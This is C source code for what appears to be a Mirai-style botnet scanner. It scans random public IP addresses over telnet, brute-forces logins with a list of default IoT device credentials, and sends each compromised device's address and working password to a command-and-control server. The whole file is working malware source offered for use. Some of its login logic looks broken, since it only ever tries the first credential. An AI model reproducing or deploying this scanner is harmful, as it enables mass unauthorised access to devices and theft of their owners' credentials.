#include "includes.h"
#include "scanner.h"
#include "rand.h"
#include "table.h"
#include "util.h"

#ifdef SELFREP

#define SCANNER_MAX_CONNS 256
#define SCANNER_RAW_PPS 384

/* Scanner states */
#define SC_CLOSED 0
#define SC_CONNECTING 1
#define SC_HANDLE_IACS 2
#define SC_WAITING_USERNAME 3
#define SC_WAITING_PASSWORD 4
#define SC_WAITING_PASSWD_RESP 5
#define SC_WAITING_ENABLE_RESP 6
#define SC_WAITING_SYSTEM_RESP 7
#define SC_WAITING_SHELL_RESP 8
#define SC_WAITING_SH_RESP 9
#define SC_WAITING_TOKEN_RESP 10

/* Credential structure */
struct scanner_credential {
    char *username;
    char *password;
};

/* Connection structure */
struct scanner_connection {
    int fd;
    uint8_t state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    time_t last_recv;
    time_t connect_time;
};

static struct scanner_connection conns[SCANNER_MAX_CONNS];
static int conn_count = 0;

/* Telnet negotiation bytes */
static uint8_t iac_buf[10];
static int iac_pos = 0;

/* Sample credentials - expand with full list from all three codebases */
static struct scanner_credential credentials[] = {
    {"root", "root"},
    {"root", "123456"},
    {"root", "admin"},
    {"root", "password"},
    {"root", "vizxv"},
    {"root", "xc3511"},
    {"admin", "admin"},
    {"admin", "password"},
    {"support", "support"},
    {"guest", "guest"},
    {"user", "user"},
    {"default", "default"},
    {NULL, NULL}
};

static void scanner_connect(struct scanner_connection *);
static void scanner_close(struct scanner_connection *);
static void scanner_handle_recv(struct scanner_connection *);
static ipv4_t get_random_ip(void);
static BOOL is_rfc1918(ipv4_t);

void scanner_init(void) {
    int i;
    
    if (fork() == 0) {
        /* Initialize connections */
        for (i = 0; i < SCANNER_MAX_CONNS; i++) {
            conns[i].fd = -1;
            conns[i].state = SC_CLOSED;
        }
        
        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            
            FD_ZERO(&fdset);
            
            /* Add all active connections to fdset */
            for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                if (conns[i].state != SC_CLOSED) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }
            
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            
            int nfds = select(maxfd + 1, &fdset, NULL, NULL, &tv);
            
            /* Check for timeouts */
            time_t now = time(NULL);
            for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                if (conns[i].state != SC_CLOSED && now - conns[i].last_recv > 30) {
                    scanner_close(&conns[i]);
                }
            }
            
            /* Process readable sockets */
            if (nfds > 0) {
                for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                    if (conns[i].state != SC_CLOSED && FD_ISSET(conns[i].fd, &fdset)) {
                        scanner_handle_recv(&conns[i]);
                    }
                }
            }
            
            /* Start new connections */
            for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                if (conns[i].state == SC_CLOSED) {
                    conns[i].dst_addr = get_random_ip();
                    conns[i].dst_port = 23;
                    scanner_connect(&conns[i]);
                    break;
                }
            }
        }
    }
}

static void scanner_connect(struct scanner_connection *conn) {
    struct sockaddr_in addr;
    
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;
    
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);
    
    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));
    
    conn->state = SC_CONNECTING;
    conn->connect_time = time(NULL);
    conn->last_recv = time(NULL);
}

static void scanner_close(struct scanner_connection *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
    conn->state = SC_CLOSED;
}

static void scanner_handle_recv(struct scanner_connection *conn) {
    char buf[4096];
    int n;
    
    n = recv(conn->fd, buf, sizeof(buf), 0);
    if (n <= 0) {
        scanner_close(conn);
        return;
    }
    
    conn->last_recv = time(NULL);
    
    /* Handle telnet negotiation */
    if (conn->state == SC_CONNECTING || conn->state == SC_HANDLE_IACS) {
        int i;
        for (i = 0; i < n; i++) {
            if (buf[i] == 0xFF) {
                conn->state = SC_HANDLE_IACS;
                iac_buf[iac_pos++] = buf[i];
            } else if (conn->state == SC_HANDLE_IACS) {
                iac_buf[iac_pos++] = buf[i];
                if (iac_pos >= 3) {
                    /* Send telnet option response */
                    uint8_t resp[3];
                    if (iac_buf[1] == 0xFD || iac_buf[1] == 0xFE) {
                        resp[0] = 0xFF;
                        resp[1] = 0xFC;
                        resp[2] = iac_buf[2];
                        send(conn->fd, resp, 3, 0);
                    }
                    iac_pos = 0;
                }
            }
        }
        
        /* Check if negotiation complete */
        if (iac_pos == 0 && n > 0) {
            conn->state = SC_WAITING_USERNAME;
            
            /* Try first credential */
            char *username = credentials[0].username;
            char *password = credentials[0].password;
            
            send(conn->fd, username, util_strlen(username), 0);
            send(conn->fd, "\r\n", 2, 0);
            
            conn->state = SC_WAITING_PASSWORD;
        }
        return;
    }
    
    /* State machine for login */
    switch (conn->state) {
        case SC_WAITING_PASSWORD:
            if (util_stristr(buf, n, "login") || util_stristr(buf, n, "username")) {
                /* Send password */
                char *password = credentials[0].password;
                send(conn->fd, password, util_strlen(password), 0);
                send(conn->fd, "\r\n", 2, 0);
                conn->state = SC_WAITING_PASSWD_RESP;
            }
            break;
            
        case SC_WAITING_PASSWD_RESP:
            if (util_stristr(buf, n, "error") || util_stristr(buf, n, "failed") || 
                util_stristr(buf, n, "invalid") || util_stristr(buf, n, "incorrect")) {
                /* Login failed, try next credential */
                scanner_close(conn);
            } else {
                /* Try to get shell */
                send(conn->fd, "shell\r\n", 7, 0);
                conn->state = SC_WAITING_SHELL_RESP;
            }
            break;
            
        case SC_WAITING_SHELL_RESP:
            if (util_stristr(buf, n, "shell") || util_stristr(buf, n, "#") || 
                util_stristr(buf, n, "$") || util_stristr(buf, n, ">")) {
                /* Got shell - report to C&C */
                uint8_t report[16];
                uint32_t addr = conn->dst_addr;
                uint16_t port = htons(conn->dst_port);
                
                report[0] = (addr >> 24) & 0xFF;
                report[1] = (addr >> 16) & 0xFF;
                report[2] = (addr >> 8) & 0xFF;
                report[3] = addr & 0xFF;
                report[4] = (port >> 8) & 0xFF;
                report[5] = port & 0xFF;
                report[6] = util_strlen(credentials[0].username);
                memcpy(report + 7, credentials[0].username, report[6]);
                report[7 + report[6]] = util_strlen(credentials[0].password);
                memcpy(report + 8 + report[6], credentials[0].password, report[7 + report[6]]);
                
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in cnc;
                cnc.sin_family = AF_INET;
                cnc.sin_addr.s_addr = inet_addr(CNC_ADDR);
                cnc.sin_port = htons(SCAN_CB_PORT);
                
                if (connect(fd, (struct sockaddr *)&cnc, sizeof(cnc)) == 0) {
                    send(fd, report, 8 + report[6] + report[7 + report[6]], 0);
                }
                close(fd);
                
                scanner_close(conn);
            } else {
                scanner_close(conn);
            }
            break;
            
        default:
            scanner_close(conn);
            break;
    }
}

static ipv4_t get_random_ip(void) {
    ipv4_t addr;
    
    while (TRUE) {
        addr = rand_next();
        
        /* Skip RFC1918 and other reserved ranges */
        if (is_rfc1918(addr)) continue;
        
        /* Skip loopback */
        if ((addr >> 24) == 127) continue;
        
        /* Skip multicast */
        if ((addr >> 28) == 0xE) continue;
        
        break;
    }
    
    return addr;
}

static BOOL is_rfc1918(ipv4_t addr) {
    uint8_t *octets = (uint8_t *)&addr;
    
    /* 10.0.0.0/8 */
    if (octets[0] == 10) return TRUE;
    
    /* 172.16.0.0/12 */
    if (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31) return TRUE;
    
    /* 192.168.0.0/16 */
    if (octets[0] == 192 && octets[1] == 168) return TRUE;
    
    return FALSE;
}

#endif
